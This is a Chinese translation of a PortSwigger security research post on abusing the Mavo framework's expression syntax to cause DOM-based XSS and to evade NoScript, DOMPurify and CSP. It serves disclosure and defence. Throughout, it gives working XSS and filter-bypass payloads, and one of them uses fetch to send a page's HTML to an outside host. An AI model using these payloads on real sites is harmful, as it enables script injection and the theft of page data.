> 原文链接: https://www.anquanke.com//post/id/86849 


# 【技术分享】妙用JavaScript绕过XSS过滤


                                阅读量   
                                **227856**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：portswigger.net
                                <br>原文地址：[http://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html](http://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t018a1dbe5af2452044.png)](https://p3.ssl.qhimg.com/t018a1dbe5af2452044.png)

译者：[blueSky](http://bobao.360.cn/member/contribute?uid=1233662000)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言**

****

在一年一度的AppSec Europe会议上， Sebastian Lekies，Krzysztof Kotowicz和Eduardo Vela Nava三人共同展示了如何使用JavaScript框架来绕过XSS缓解机制。在这篇文章中，我将通过Mavo框架对如何绕过XSS缓解机制进行系统性的分析，特别是绕过NoScript的XSS过滤器。 Mavo框架旨在通过使用户能够使用纯HTML创建交互式Web应用程序来简化Web开发。 它在[Smashing magazine](https://www.smashingmagazine.com/2017/05/introducing-mavo/) 站点上发布，我在Twitter上发现了它，出于兴趣使然我开始对该框架的的语法和功能进行研究和分析。 

<br>

**基于DOM的XSS漏洞利用**

****

Mavo框架会创建一个名为$url的对象，该对象能够为开发人员提供访问GET参数的便捷方法。例如，如果你想访问GET参数“x”，那么你可以访问$ url对象的“x”属性，示例如下所示： 

```
$url.x //获取GET参数x
```

但是，这种方便性也增加了开发人员引入基于DOM的XSS漏洞的可能性。 我在2017年5月31日向CSS工作小组报告了这样一个问题：他们使用Mavo来管理CSS规范上的评论功能，并使用$url来分配一个href超链接对象，HTML代码如下所示： 

```
&lt;h1&gt; &lt;a href="`{`$url.spec`}`" mv-attribute="null" property="title"&gt; &lt;/a&gt; &lt;/h1&gt;
```

我们可以看到，上述代码使用$url对象从URL中获取参数的值。但是，这种情况只有在获取到有效数据的时候，超链接才会显示。因此为了达到攻击测试的目的，我需要注入一个有效的相对路径的JavaScript URL，以便获取数据并显示链接，代码如下所示。 

```
javascript:alert(1)%252f%252f..%252fcss-images
```

上面的攻击向量中提供了一个有效的相对路径的URL，因此Mavo在不存在的**javascript：alert(1)**文件夹中查找数据，并使用两个编码的双斜杠和“..”遍历我们的攻击向量。 在攻击向量中，由于双斜杠可以作为JavaScript中的注释因此我使用了两个斜杠，使得当JavaScript URL执行时，它会注释掉攻击向量中的其余路径。 然后它返回到css-images目录，以便成功加载数据并显示URL。由于Mavo框架是在客户端使用的，因此我们可以在我们的服务器上复现这个问题，感兴趣的读者可以[点击查看相关的POC攻击向量](http://portswigger-labs.net/mavo_dom_based_xss/?spec=javascript:alert(1)%252f%252f..%252fcss-images&amp;doc=cr-2012)。

<br>

**远程加载JSON数据**

****

Mavo框架有一个特别的功能，该功能可以将任何Mavo应用的数据源更改为本地存储或远程存储。 这是一个存在漏洞的设计，因为攻击者可以借此控制你的数据并可能使用这些数据来攻击你的网站或者在你的网站中注入恶意的JavaScript URL。 Mavo网站上的演示应用程序就有这个漏洞，我们可以使用source参数指向一个外部的JSON文件，以此来自定义该应用程序上的数据。 这个外部JSON文件具有CORS header：“Access-Control-Allow-Origin：*”，使得数据能够跨域加载。 然后应用程序使用这些数据来创建一个anchor href，代码如下所示： 

```
&lt;a property="companyURL" mv-attribute="null" href="[companyURL]" target="_blank"&gt; http://lea.verou.me &lt;/a&gt;
```

在href属性中，demo应用程序使用了一个Mavo表达式，“companyURL”从外部JSON中获得。如果我在外部JSON文件中包含以下内容： 



```
`{`
    “companyLogo”：“http://lea.verou.me/logo.svg”，
    “companyName”：“Pwnd Pwnd”，
    “companyAddress”：“Pwnd”，
    “companyURL”：“javascript：alert(1)”，
    “companyEmail”：“pwnd”， ...
```

当上述的攻击向量执行的时候，由于加载了外部数据并将当前的数据给替换了，此时一个JavaScript URL便在文档中成功创建了，感兴趣的读者可以点击查看相关的POC攻击向量 。 

<br>

**绕过NoScript XSS检测**

****

默认情况下，Mavo允许我们将HTML文档中的MavoScript嵌入到方括号内。 MavoScript是JavaScript的一种扩展，但是它和JavaScript有一些不同。 例如，它支持关键字'and'，'or'以及'mod'运算操作，它将'='操作的含义更改为比较而非赋值，并支持Math和date对象中的各种功能的函数。有关MavoScript语法的更多信息，请参见此处 。如果Mavo遇到无效的MavoScript，那么它将把无效的MavoScript当成JavaScript来处理。如果我们想要强制执行JavaScript模式，那么可以在表达式开始的地方使用注释。例如，假如我们想要Mavo来计算HTML文档中的“1+1”表达式的值，并且该页面容易受到XSS的攻击。 Mavo使用[]来计算表达式的值，而Angular使用`{``{``}``}`来计算表达式的值，因此我们在HTML文档中可以注入以下表达式：

```
inj=[1%2b1]
```

在Mavo中是完全没有沙盒的，但我们的代码会被重写，并在一个with语句中执行。要调用alert函数，我们需要使用window对象，这里window.alert或self.alert函数都可以，代码如下所示： 

```
[self.alert(1)]
```

我们甚至可以通过使用间接调用达到不使用window对象也可以调用alert函数的目的，代码如下所示：

```
[(1，alert)(1)]
```

Mavo还支持一些有趣的自定义HTML属性，mv-expression允许我们可以定义用作表达式分隔符的字符。例如，如果要我们想实现类似Angular的双卷曲语法的功能，可以使用mv-expressions属性来实现，代码如下所示： 

```
&lt;div mv-expressions =“`{``{``}``}`”&gt; `{``{`top.alert(1)`}``}` &lt;/div&gt;
```

此外，Mavo还支持“property”属性，该属性可以将一个DOM元素的值链接到一个JavaScript变量。 Mavo网站上有关于该属性使用方法的一个例子，代码如下所示： 

```
&lt;p&gt;Slider value: [strength]/100&lt;/p&gt;
&lt;input type="range" property="strength" title="[strength]%" /&gt;
```

Mavo框架中还有两个有趣的功能，那就是mv-value和mv-if，这两个功能允许我们执行没有[]分隔符的表达式。如果表达式计算为false，mv-if则隐藏DOM元素，并且mv-value计算表达式并更改DOM元素的值。值得注意的是，这些属性将适用于HTML文档中的任何标签，示例代码如下所示： 

```
&lt;div mv-if=”false”&gt;Hide me&lt;/div&gt;
```

通过我的研究，发现了MavoScript表达式中有一些有趣的用法。

（1）只要表达式由字母，数字和下划线组成，我们就可以使用无符号字符串；

（2）对象属性将被转换为空字符串（如果它们不存在）。例如，即使没有这些属性存在，也可以使用x.y.z。 

基于上述的那些发现，我开始着手我的测试，看看我是否可以绕过NoScript的XSS过滤器（DOMPurify和CSP）。由于我们可以使用Mavo的data- *属性，因此绕过DOMPurify过滤器是很容易的。通常在Mavo中，我们一般都使用mv-前缀，但是Mavo还支持data-mv- *前缀使得文档能够通过HTML验证。 为了使Mavo与CSP一起使用，我们必须启用'unsafe-eval'参数。 这是一个存在漏洞的设计，因为一旦“unsafe-eval”参数被启用，我们就可以在JavaScript中调用各种eval函数。在实际的绕过试验中，第一次尝试绕过是使用JavaScript中的“fetch”函数证明了可以绕过NoScript过滤器，并且能够获取和发送HTML到远程目标机器中，示例代码如下所示： 

```
[1 and self.fetch('//subdomain2.portswigger-labs.net/'&amp;encodeURIComponent(document.body.innerHTML))]
```

因为NoScript的过滤器不能解析“and”关键字和方括号表达式语法，因此我可以使用它们来绕过检测并使用fetch发送HTML文档。 Mavo还将“＆”定义为一个concat运算符，因此在我的POC中使用该“&amp;”来连接字符串，感兴趣的读者可以点击查看相关的POC攻击向量 。 

Giorgio（NoScript的作者）修改了NoScript的XSS检测机制，以检查这些新关键字和方括号语法，但是我通过滥用MavoScript解析器再次绕过了NoScript的检测机制，示例代码如下所示： 

```
[''=''or self.alert(lol)]
```

在上面的代码中，MavoScript解析器把“=”解析为“相等”测试，而不是赋值。 我用这个方法逃避了NoScript的检测机制。 MavoScript将“或”定义为一个运算符，由于该运算符没有在JavaScript中定义，因此NoScript不会对它进行检测。如前所述，Mavo还允许我们在mv-if属性中执行没有分隔符的表达式，因此我可以使用下面这段代码来绕过NoScript的新检测机制。 

```
&lt;a data-mv-if='1 or self.alert(1)'&gt;test&lt;/a&gt;
```

还记得mv-expressions属性吗?我们可以使用该属性定义自己的分隔符，而且可以使用任何字符来做到这一点，因此我再次使用该属性逃避了DOMPurify的检测，示例代码如下所示： 

```
&lt;div data-mv-expressions =“lolx lolx”&gt; lolxself.alert（'lol'）lolx &lt;/div&gt;
```

Giorgio改进了NoScript，并能够检测到上述的攻击向量。不过我仍然发现另一种绕过NoScript的方法，那就是使用元素上的多个属性来构造我们的攻击向量。多个表达式可以在属性内部使用，并且可以被合并到一起，示例代码如下所示： 

```
&lt;a href='[javascript][""][[Title][1][x.rel]' rel=) id=x title=alert(&gt; test &lt;/a&gt;
```

我们也可以将常规属性值与表达式混合使用，以此来避开过滤器，示例代码如下所示： 

```
&lt;a href=javascript[x.rel]1) id=x rel=:alert(&gt; test &lt;/a&gt;
```

但是，经过我的测试发现，Nocript最新版本还是能够检测到我们上述构造的攻击向量。不过，我还是想出了一个攻击向量以绕过它的检测，示例代码如下所示： 

```
[/**/x='javascript'][/**/x+=':alert'+y.rel+y.title]&lt;a href=[x] id=y title=1) rel=(&gt;test&lt;/a&gt;
```

我使用注释将MavoScript强制转化到JavaScript模式。 一旦进入JavaScript模式，我在javascript字符串加上双引号，然后我将该字符串与anchor 属性的值相结合。由于Mavo解析器使用字母作为操作符以及NoScript不会对其后跟随字母数字的函数调用进行检测，因此我可以利用这些特性来躲避检测。同时，这种方法也可以用来绕过CSP检测。注意mod是一个运算符，因此允许1跟随运算符后面即使没有空格也可以，示例代码如下所示： 

```
[self.alert(1)MOD1]
```

最后结合Mavo允许使用无引号字符串或者直接使用跟随在“and”等关键字之后的无引号字符串，我再次绕过了NoScript的检查，示例代码如下所示： <br>

```
[omglol mod 1 mod self.alert(1)andlol]
```

[点击查看PoC](http://portswigger-labs.net/mavo/?csp=1&amp;dompurify=1&amp;inj=%5Bomglol%20mod%201%20mod%20self.alert(1)andlol%5D)<br>



**结论**

****

像Mavo这样的框架可以使开发人员的工作变得更轻松，但是为HTML和JavaScript引入新的语法通常会破坏其安全机制（如CSP，NoScript和DOMPurify）。该框架还提供新的操作方式，将不可思议的传统漏洞（如DOMXSS）引入到应用程序中，甚至会引入数据源劫持等漏洞。 
